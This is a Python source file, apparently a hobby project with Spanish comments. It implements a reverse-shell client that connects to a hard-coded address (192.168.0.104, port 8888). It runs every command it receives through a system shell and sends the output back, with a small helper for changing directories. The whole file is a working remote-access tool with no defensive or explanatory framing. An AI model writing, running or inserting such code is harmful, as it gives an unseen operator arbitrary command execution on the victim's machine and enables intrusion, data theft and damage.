import socket
import sys
import subprocess
import os

class Client(object):
    def __init__(self, ip, port):
        try:
            self.client = socket.socket()
            self.client.connect((ip, int(port)))

            while True:
                command = self.client.recv(1024).decode('UTF-8')
                if not command:
                    self.client.close()
                    break
                cmd = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                if 'cd' in command:
                    self.command_cd(command)
                    salida = 'change dir'
                else:
                    output = cmd.stdout.read()
                    output_error = cmd.stderr.read()
                    salida = output + output_error
                
                try:
                    self.client.send(salida.encode('UTF-8'))
                except:
                    self.client.send(salida)

        except:

            raise
    
    def command_cd(self, command):
        # Linux
        current = os.getcwd().split('/')
        if command == 'cd ..':
            path = '/'.join(current[:-1])
            print(path)
            os.chdir(path)
        else:
            try:
                path = command.replace('cd ', '')
                print(path)
                if '/' in path:
                    print("A")
                    move_path = path
                else:
                    current.append(path)
                    move_path = '/'.join(current)
                os.chdir(move_path)
            except Exception as e:
                print(e)
        

#Introducir IP servidor como argumento a la hora de ejecutar el script o como input si no se ha introducido anteriormente
# if len(sys.argv) == 1:
#     ip, port = input('Ip servidor: '), input('Puerto: ')
# else:
#     ip, port = sys.argv[1], sys.argv[2]

ip = '192.168.0.104'
port = 8888

client = Client(ip, port)
